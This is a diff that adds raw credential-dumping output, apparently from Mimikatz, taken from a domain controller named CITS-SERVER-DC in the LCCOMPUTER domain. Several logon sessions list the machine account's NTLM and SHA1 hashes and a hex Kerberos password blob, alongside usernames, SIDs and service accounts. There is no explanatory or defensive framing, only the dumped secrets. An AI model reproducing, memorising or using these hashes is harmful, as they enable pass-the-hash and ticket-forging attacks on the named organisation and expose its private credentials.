+SID               : S-1-5-80-3763098489-2620711134-3767674660-4164406483-1621732
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : CITS-SERVER-DC$
+Domain            : LCCOMPUTER
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:24:55 AM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : cits-server-dc$
+	 * Domain   : LCCOMPUTER.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 37150796 (00000000:0236e04c)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/12/2023 12:29:52 PM
+SID               : S-1-5-90-3
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 37150768 (00000000:0236e030)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/12/2023 12:29:52 PM
+SID               : S-1-5-90-3
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 10544423 (00000000:00a0e527)
+Session           : RemoteInteractive from 2
+User Name         : mariocort
+Domain            : LCCOMPUTER
+Logon Server      : CITS-SERVER-DC
+Logon Time        : 11/12/2023 7:12:20 AM
+SID               : S-1-5-21-1584996946-673974696-336192291-1150
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 4586017 (00000000:0045fa21)
+Session           : Service from 0
+User Name         : MSSQL$MICROSOFT##WID
+Domain            : NT SERVICE
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:41:47 AM
+SID               : S-1-5-80-1184457765-4068085190-3456807688-2200952327-3769537534
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 2256381 (00000000:00226dfd)
+Session           : Service from 0
+User Name         : B757EA16-C9FE-458A-925A-120521787EB1
+Domain            : NT VIRTUAL MACHINE
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:31:13 AM
+SID               : S-1-5-83-1-3075992086-1166723582-85088914-2977855521
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 2125024 (00000000:00206ce0)
+Session           : Service from 0
+User Name         : 112B0AB4-15D6-4B11-952F-5328A6F5BFD5
+Domain            : NT VIRTUAL MACHINE
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:30:26 AM
+SID               : S-1-5-83-1-288033460-1259410902-676540309-3586127270
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 219333 (00000000:000358c5)
+Session           : Service from 0
+User Name         : MSSQLSERVER
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:26:31 AM
+SID               : S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:24:57 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+
